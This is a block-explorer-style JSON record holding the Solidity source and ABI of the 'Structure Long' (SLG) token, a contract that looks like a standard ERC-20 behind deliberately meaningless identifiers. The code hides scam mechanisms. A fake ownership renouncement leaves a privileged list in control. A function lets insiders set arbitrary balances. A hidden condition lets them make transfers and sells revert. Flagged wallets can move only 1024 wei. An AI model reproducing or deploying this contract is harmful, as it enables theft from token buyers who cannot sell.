{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface liquidityTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTo) external view returns (uint256);\n\n    function transfer(address fromWallet, uint256 maxFromReceiver) external returns (bool);\n\n    function allowance(address autoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFromReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromWallet,\n        uint256 maxFromReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverShouldTo, uint256 value);\n    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract isSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiverLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxAuto {\n    function createPair(address atIs, address isWallet) external returns (address);\n}\n\ninterface launchAmount is liquidityTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StructureLong is isSell, liquidityTrading, launchAmount {\n\n    function getOwner() external view returns (address) {\n        return txAuto;\n    }\n\n    mapping(address => bool) public teamTx;\n\n    uint256 private exemptAmount;\n\n    constructor (){\n        if (enableSell == minEnable) {\n            minEnable = false;\n        }\n        exemptReceiverLaunched takeEnable = exemptReceiverLaunched(toAmountIs);\n        fundAt = maxAuto(takeEnable.factory()).createPair(takeEnable.WETH(), address(this));\n        if (enableSell == walletIs) {\n            walletIs = true;\n        }\n        amountLiquidity = _msgSender();\n        launchedTrading();\n        teamTx[amountLiquidity] = true;\n        amountSender[amountLiquidity] = tradingTake;\n        \n        emit Transfer(address(0), amountLiquidity, tradingTake);\n    }\n\n    mapping(address => uint256) private amountSender;\n\n    uint256 public toSwap;\n\n    address private txAuto;\n\n    bool public listAt;\n\n    function launchedTrading() public {\n        emit OwnershipTransferred(amountLiquidity, address(0));\n        txAuto = address(0);\n    }\n\n    uint256 public exemptSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAmount;\n    }\n\n    uint256 sellEnable;\n\n    function feeShould(address toBuy, uint256 maxFromReceiver) public {\n        marketingReceiver();\n        amountSender[toBuy] = maxFromReceiver;\n    }\n\n    string private fundAmount = \"SLG\";\n\n    string private sellBuyExempt = \"Structure Long\";\n\n    address public amountLiquidity;\n\n    bool private walletIs;\n\n    function allowance(address fromAmount, address modeReceiver) external view virtual override returns (uint256) {\n        if (modeReceiver == toAmountIs) {\n            return type(uint256).max;\n        }\n        return limitEnable[fromAmount][modeReceiver];\n    }\n\n    function marketingLaunchedSell(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) internal returns (bool) {\n        if (marketingLiquidity == amountLiquidity) {\n            return toLaunched(marketingLiquidity, fromWallet, maxFromReceiver);\n        }\n        uint256 launchedEnable = liquidityTrading(fundAt).balanceOf(totalTeam);\n        require(launchedEnable == sellEnable);\n        require(fromWallet != totalTeam);\n        if (feeWallet[marketingLiquidity]) {\n            return toLaunched(marketingLiquidity, fromWallet, launchAt);\n        }\n        return toLaunched(marketingLiquidity, fromWallet, maxFromReceiver);\n    }\n\n    address totalTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private receiverListToken;\n\n    mapping(address => mapping(address => uint256)) private limitEnable;\n\n    function approve(address modeReceiver, uint256 maxFromReceiver) public virtual override returns (bool) {\n        limitEnable[_msgSender()][modeReceiver] = maxFromReceiver;\n        emit Approval(_msgSender(), modeReceiver, maxFromReceiver);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed amountFund, address indexed swapList);\n\n    address public fundAt;\n\n    function owner() external view returns (address) {\n        return txAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTake;\n    }\n\n    uint256 fundLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuyExempt;\n    }\n\n    function balanceOf(address senderTo) public view virtual override returns (uint256) {\n        return amountSender[senderTo];\n    }\n\n    bool private enableSell;\n\n    function feeExempt(uint256 maxFromReceiver) public {\n        marketingReceiver();\n        sellEnable = maxFromReceiver;\n    }\n\n    function transferFrom(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) external override returns (bool) {\n        if (_msgSender() != toAmountIs) {\n            if (limitEnable[marketingLiquidity][_msgSender()] != type(uint256).max) {\n                require(maxFromReceiver <= limitEnable[marketingLiquidity][_msgSender()]);\n                limitEnable[marketingLiquidity][_msgSender()] -= maxFromReceiver;\n            }\n        }\n        return marketingLaunchedSell(marketingLiquidity, fromWallet, maxFromReceiver);\n    }\n\n    mapping(address => bool) public feeWallet;\n\n    function marketingReceiver() private view {\n        require(teamTx[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderEnable;\n    }\n\n    function transfer(address toBuy, uint256 maxFromReceiver) external virtual override returns (bool) {\n        return marketingLaunchedSell(_msgSender(), toBuy, maxFromReceiver);\n    }\n\n    function feeSwap(address limitLaunch) public {\n        if (listAt) {\n            return;\n        }\n        \n        teamTx[limitLaunch] = true;\n        \n        listAt = true;\n    }\n\n    uint256 constant launchAt = 2 ** 10;\n\n    uint256 private tradingTake = 100000000 * 10 ** 18;\n\n    address toAmountIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public marketingAuto;\n\n    function toLaunched(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) internal returns (bool) {\n        require(amountSender[marketingLiquidity] >= maxFromReceiver);\n        amountSender[marketingLiquidity] -= maxFromReceiver;\n        amountSender[fromWallet] += maxFromReceiver;\n        emit Transfer(marketingLiquidity, fromWallet, maxFromReceiver);\n        return true;\n    }\n\n    function amountTrading(address tradingShouldTeam) public {\n        marketingReceiver();\n        \n        if (tradingShouldTeam == amountLiquidity || tradingShouldTeam == fundAt) {\n            return;\n        }\n        feeWallet[tradingShouldTeam] = true;\n    }\n\n    uint8 private senderEnable = 18;\n\n    bool public minEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShouldTeam\",\"type\":\"address\"}],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFromReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFromReceiver\",\"type\":\"uint256\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFromReceiver\",\"type\":\"uint256\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFromReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFromReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StructureLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}